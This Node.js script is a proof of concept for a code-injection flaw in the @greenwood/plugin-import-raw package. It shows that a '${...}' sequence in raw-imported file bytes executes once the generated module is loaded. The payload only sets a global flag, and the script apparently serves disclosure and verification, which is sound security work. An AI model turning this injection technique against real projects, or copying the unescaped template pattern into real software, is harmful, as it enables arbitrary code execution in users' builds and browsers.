// Repro: code injection in @greenwood/plugin-import-raw.
// Runs the EXACT transform from packages/plugin-import-raw/src/index.js:100 against
// attacker-controlled file bytes, then evaluates the generated module (as a bundler or
// browser would) to show the injected expression executes.
//
//   node repro.mjs
//
// Expected on v0.34.0: __PWNED__ is defined -> the `${...}` in the file body executed.

// Literal bytes of a file imported with `?type=raw` (e.g. an asset from a dependency,
// a CMS, or a user upload). NOT evaluated here — it is a plain string.
const fileBytes = 'prefix ${ globalThis.__PWNED__ = 40 + 2 } suffix';

// --- EXACT line 100 of plugin-import-raw/src/index.js ---
const contents =
  `const raw = \`${fileBytes.replace(/\r?\n|\r/g, " ").replace(/\\/g, "\\\\")}\`;\nexport default raw;`;

console.log("generated module (shipped to bundler + browser):\n" + contents + "\n");

delete globalThis.__PWNED__;
const mod = await import("data:text/javascript," + encodeURIComponent(contents));
console.log("default export =>", JSON.stringify(mod.default));
console.log("globalThis.__PWNED__ =>", globalThis.__PWNED__,
  globalThis.__PWNED__ !== undefined ? "  <-- INJECTED EXPRESSION EXECUTED" : "");
